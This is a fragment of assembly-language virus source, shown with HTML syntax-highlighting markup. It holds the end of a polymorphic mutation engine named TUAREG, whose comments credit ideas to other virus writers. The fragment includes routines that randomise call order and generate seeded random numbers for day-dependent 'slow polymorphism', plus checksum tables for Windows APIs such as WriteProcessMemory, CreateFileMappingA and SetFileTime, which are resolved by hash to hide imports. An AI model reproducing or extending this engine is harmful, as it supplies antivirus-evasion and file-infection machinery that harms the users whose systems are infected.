</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetCurrentDirectoryA(Buffer_Size,Buffer)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">2369A80Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetWindowsDirectoryA(Buffer,Buffer_Size)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">6D1CE819h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetSystemDirectoryA(Buffer,Buffer_Size)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">4948E80Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetDriveTypeA(NULL)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00019307h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; BOOL GetComputerNameA(Buffer,Buffer_Size)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">012DB157h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; BOOL IsBadWritePtr(Buffer,Buffer_Size)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0022A17Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetTickCount(void)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00F97476h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; BOOL IsBadReadPtr(Buffer,Buffer_Size)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000450BEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; BOOL IsBadCodePtr(Buffer)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0022A3EEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD GetCurrentFiber(void)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">048DC056h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD LocalHandle(Address)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00020491h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD LocalSize(Address)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00101B69h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;; DWORD LocalFlags(Handle)</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00040780Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc1">;; This function calls in a random order to the addresses of the functions</span><span class="sc0">
</span><span class="sc1">;; passed in EBX, ECX, EDX and ESI. It exchanges randomly its values among</span><span class="sc0">
</span><span class="sc1">;; them to get a random order, and after that pushes in the stack all this</span><span class="sc0">
</span><span class="sc1">;; addresses, so when the called functions return, the next function take</span><span class="sc0">
</span><span class="sc1">;; control, and in last terme the return of this function is complete (it's</span><span class="sc0">
</span><span class="sc1">;; the same than doing CALL EBX/CALL ECX/CALL EDX/CALL ESI/RET in the part</span><span class="sc0">
</span><span class="sc1">;; where we push the addresses, but pushing them we save bytes and we haven't</span><span class="sc0">
</span><span class="sc1">;; to save the register values).</span><span class="sc0">
</span><span class="sc5">RandomCalling</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">      </span><span class="sc1">; Do the garbling 5 times</span><span class="sc0">
        </span><span class="sc5">@@J_00</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0"> </span><span class="sc1">; Get random ZF, SF, CF and PF</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@J_01</span><span class="sc0">        </span><span class="sc1">; Jump if ZF</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; Exchange</span><span class="sc0">
        </span><span class="sc5">@@J_01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">js</span><span class="sc0">    </span><span class="sc5">@@J_02</span><span class="sc0">        </span><span class="sc1">; Jump if SF</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; Exchange</span><span class="sc0">
        </span><span class="sc5">@@J_02</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">@@J_03</span><span class="sc0">        </span><span class="sc1">; Jump if CF</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">    </span><span class="sc1">; Exchange</span><span class="sc0">
        </span><span class="sc5">@@J_03</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jp</span><span class="sc0">    </span><span class="sc5">@@J_04</span><span class="sc0">        </span><span class="sc1">; Jump if JP</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">; Exchange</span><span class="sc0">
        </span><span class="sc5">@@J_04</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@J_00</span><span class="sc0">        </span><span class="sc1">; Repeat 5 times</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">   </span><span class="sc1">; Push all garbled addresses</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">   </span><span class="sc1">; Jump here and conserve the return address</span><span class="sc0">
</span><span class="sc5">RandomCalling</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; One of the most used functions in the engine. I think it's idea of Vecna</span><span class="sc0">
</span><span class="sc1">;; in one of his viruses. You get a random number and you save this random</span><span class="sc0">
</span><span class="sc1">;; as flags, so you have random flags to use with conditional jumps, getting</span><span class="sc0">
</span><span class="sc1">;; the same effect as CALL Random/AND AL,1/JZ xxx, but more optimized and with</span><span class="sc0">
</span><span class="sc1">;; more flags to use. Since SAHF only saves the general purpose flags, the</span><span class="sc0">
</span><span class="sc1">;; ones that can be modified with CMP (for example), we are sure that others</span><span class="sc0">
</span><span class="sc1">;; like IF or TF (important ones) are not modified.</span><span class="sc0">
</span><span class="sc5">RandomFlags</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Save EAX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">   </span><span class="sc1">; Get a random number in AH</span><span class="sc0">
                </span><span class="sc6">sahf</span><span class="sc0">             </span><span class="sc1">; Load it in the flags register</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Restore EAX</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">              </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">RandomFlags</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; The random generator. I use this routine since MeDriPolEn, and it had a 48</span><span class="sc0">
</span><span class="sc1">;; bits seed which generated near a perfect random sequence. Now it's conver-</span><span class="sc0">
</span><span class="sc1">;; ted to 32 bits, so it has a 96 bits seed (!!! - outstanding!).</span><span class="sc0">
</span><span class="sc5">Random</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                              </span><span class="sc1">; Save register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio1</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get 1st seed</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Decrease to avoid linearity</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio2</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; XOR with 2nd seed</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Result in CL</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0"> </span><span class="sc1">; ROL the 1st seed CL</span><span class="sc0">
                                                    </span><span class="sc1">; times (random)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Add (1st XOR 2nd) to 1st</span><span class="sc0">
        </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Add the 2nd seed to (1st XOR 2nd)</span><span class="sc0">
                                           </span><span class="sc1">; with CF (random CF at the moment)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; EAX=(1st XOR 2nd)+2nd+CF</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">         </span><span class="sc1">; EAX=EAX ROL (byte)(1st XOR 2nd)</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; NOT (this breaks a possible proximity)</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">; Subtract odd constant (break the linearity)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; Modify 2nd seed</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio3</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; XOR 3rd seed with the until-this-</span><span class="sc0">
                                           </span><span class="sc1">; moment result</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; Modify 3rd seed (ROL)...</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; ...and with a 1st/2nd</span><span class="sc0">
                                                     </span><span class="sc1">; seed dependant variable</span><span class="sc0">
        </span><span class="sc6">sbb</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio3</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">; Subtract a constant value</span><span class="sc0">
                                                   </span><span class="sc1">; that could be 4 or 5</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">DwordAleatorio2</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Break linearity on 2nd seed</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; Restore register</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                             </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">Random</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">SystemTimeReceiver</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">     </span><span class="sc1">; Here we put what the API GetSystemTime</span><span class="sc0">
</span><span class="sc5">DwordAleatorio1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">12345678h</span><span class="sc0">  </span><span class="sc1">; returns. Then we put DwordAleatorio3 as</span><span class="sc0">
</span><span class="sc5">DwordAleatorio2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">9ABCDEF0h</span><span class="sc0">  </span><span class="sc1">; a modification of DwordAleatorio1 and 2,</span><span class="sc0">
</span><span class="sc5">DwordAleatorio3</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">97654321h</span><span class="sc0">
                </span><span class="sc1">;dd      87654321h  ; which are Year/Month/Day of the week/Day,</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">; so it's day-dependant (slow polymorphism)</span><span class="sc0">
                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; This variables to 0 are to make space for</span><span class="sc0">
                                </span><span class="sc1">; the function return values</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">; End of TUAREG</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;ÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀÀ;</span><span class="sc0">
</span><span class="sc1">;––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––––;</span><span class="sc0">


</span><span class="sc1">;; These are the checksums of the API names. The checksum is calculated with:</span><span class="sc0">
</span><span class="sc1">;;   XOR EAX,EAX</span><span class="sc0">
</span><span class="sc1">;;   MOV ESI,offset String</span><span class="sc0">
</span><span class="sc1">;;Loop:</span><span class="sc0">
</span><span class="sc1">;;   MOV CL,[ESI]</span><span class="sc0">
</span><span class="sc1">;;   AND CL,3</span><span class="sc0">
</span><span class="sc1">;;   ROL EAX,CL</span><span class="sc0">
</span><span class="sc1">;;   XOR AL,[ESI]</span><span class="sc0">
</span><span class="sc1">;;   INC ESI</span><span class="sc0">
</span><span class="sc1">;;   CMP BYTE PTR [ESI],0</span><span class="sc0">
</span><span class="sc1">;;   JNZ Loop</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; Which I think is quite variable and in theory it wouldn't make any problem</span><span class="sc0">
</span><span class="sc1">;; of coincidences, since it's quite variable in the result.</span><span class="sc0">
</span><span class="sc1">;; Then, the results of making this checksums (or whatever it is) to the</span><span class="sc0">
</span><span class="sc1">;; API names are as follows:</span><span class="sc0">
</span><span class="sc5">CRC_APIs</span><span class="sc0">                </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">CRC_GetProcAddress</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0342CDABh</span><span class="sc0">
</span><span class="sc5">CRC_CreateFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000147CFh</span><span class="sc0">
</span><span class="sc5">CRC_CreateProcessA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0A64AE17h</span><span class="sc0">
</span><span class="sc5">CRC_FindFirstFileA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0070244Fh</span><span class="sc0">
</span><span class="sc5">CRC_FindNextFileA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0003820Fh</span><span class="sc0">
</span><span class="sc5">CRC_GetFileAttributesA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">008AEB57h</span><span class="sc0">
</span><span class="sc5">CRC_SetFileAttributesA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00A2EB57h</span><span class="sc0">
</span><span class="sc5">CRC_GetFullPathNameA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00023117h</span><span class="sc0">
</span><span class="sc5">CRC_MoveFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0002148Fh</span><span class="sc0">
</span><span class="sc5">CRC_CopyFileA</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00008C4Fh</span><span class="sc0">
</span><span class="sc5">CRC_DeleteFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00004ACFh</span><span class="sc0">
</span><span class="sc5">CRC_WinExec</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00006EDBh</span><span class="sc0">
</span><span class="sc5">CRC__lopen</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000DC2h</span><span class="sc0">
</span><span class="sc5">CRC_MoveFileExA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000429A7h</span><span class="sc0">
</span><span class="sc5">CRC_OpenFile</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000157h</span><span class="sc0">
</span><span class="sc5">CRC_ExitProcess</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0014572Bh</span><span class="sc0">

</span><span class="sc5">CRC_WriteProcessMemory</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">0A8AE3121h</span><span class="sc0">
</span><span class="sc5">CRC_GetCurrentProcess</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">46C8D729h</span><span class="sc0">
</span><span class="sc5">CRC_CreateFileMappingA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0147EFAFh</span><span class="sc0">
</span><span class="sc5">CRC_MapViewOfFile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00950AD7h</span><span class="sc0">
</span><span class="sc5">CRC_UnmapViewOfFile</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">043D0AD7h</span><span class="sc0">
</span><span class="sc5">CRC_CloseHandle</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00011811h</span><span class="sc0">
</span><span class="sc5">CRC_SetFilePointer</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0014B9D6h</span><span class="sc0">
</span><span class="sc5">CRC_GetFileTime</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00004783h</span><span class="sc0">
</span><span class="sc5">CRC_SetFileTime</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00005383h</span><span class="sc0">
</span><span class="sc5">CRC_GetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">6D1CE819h</span><span class="sc0">
</span><span class="sc5">CRC_GetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">2369A80Ah</span><span class="sc0">
</span><span class="sc5">CRC_SetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">7369A80Ah</span><span class="sc0">
</span><span class="sc5">CRC_GetSystemDirectoryA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc2">4948E80Bh</span><span class="sc0">
</span><span class="sc5">CRC_GetSystemTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00092963h</span><span class="sc0">
</span><span class="sc5">CRC_LoadLibraryA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0011B62Bh</span><span class="sc0">
</span><span class="sc5">CRC_FindClose</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000E69F3h</span><span class="sc0">
</span><span class="sc5">CRC_WriteFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00004F07h</span><span class="sc0">
</span><span class="sc5">CRC_FreeLibrary</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000AE335h</span><span class="sc0">
                        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; This signalizes the end of the APIs</span><span class="sc0">

